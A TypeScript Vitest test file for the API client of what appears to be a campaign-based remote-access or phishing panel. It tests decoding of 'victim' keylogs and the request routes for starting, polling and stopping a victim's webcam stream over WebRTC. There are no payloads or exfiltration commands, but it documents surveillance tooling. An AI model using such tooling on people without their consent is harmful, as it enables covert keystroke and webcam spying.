import { describe, expect, it, vi } from 'vitest'

import {
  createVictimsClient,
  decodeBase64Utf8
} from '@/services/api/victims'


describe('victim keylog client', () => {
  it('decodes base64 keylogs as UTF-8', () => {
    const encoded = btoa(
      String.fromCharCode(...new TextEncoder().encode('città 😀'))
    )

    expect(decodeBase64Utf8(encoded)).toBe('città 😀')
  })

  it('preserves bounded-response metadata', async () => {
    const apiClient = {
      request: vi.fn().mockResolvedValue({
        keylogs: btoa('recent input'),
        size: 12,
        original_size: 6000000,
        truncated: true
      })
    }
    const client = createVictimsClient(apiClient)

    await expect(client.getKeylogs('campaign-1', 'victim-1')).resolves.toEqual({
      content: 'recent input',
      size: 12,
      originalSize: 6000000,
      truncated: true
    })
  })
})

describe('victim webcam client', () => {
  it('scopes ICE polling and stop requests to the webcam session', async () => {
    const apiClient = {
      request: vi.fn()
        .mockResolvedValueOnce({
          offer: { type: 'offer', sdp: 'v=0' },
          session_id: 'webcam-session-1234567890'
        })
        .mockResolvedValue({ status: 'ok' })
    }
    const client = createVictimsClient(apiClient)

    await client.requestWebcamOffer(
      'campaign-1',
      'victim-1',
      'webcam-session-1234567890'
    )
    await client.getWebcamICECandidates(
      'campaign-1',
      'victim-1',
      'webcam-session-1234567890'
    )
    await client.stopWebcam(
      'campaign-1',
      'victim-1',
      'webcam-session-1234567890'
    )

    expect(apiClient.request).toHaveBeenNthCalledWith(
      1,
      'api/campaigns/campaign-1/victims/victim-1/webcam/request-offer',
      {
        method: 'POST',
        body: JSON.stringify({
          session_id: 'webcam-session-1234567890'
        })
      }
    )
    expect(apiClient.request).toHaveBeenNthCalledWith(
      2,
      'api/campaigns/campaign-1/victims/victim-1/webcam/ice-candidates?session_id=webcam-session-1234567890'
    )
    expect(apiClient.request).toHaveBeenNthCalledWith(
      3,
      'api/campaigns/campaign-1/victims/victim-1/webcam/stop',
      {
        method: 'POST',
        body: JSON.stringify({
          session_id: 'webcam-session-1234567890'
        })
      }
    )
  })
})
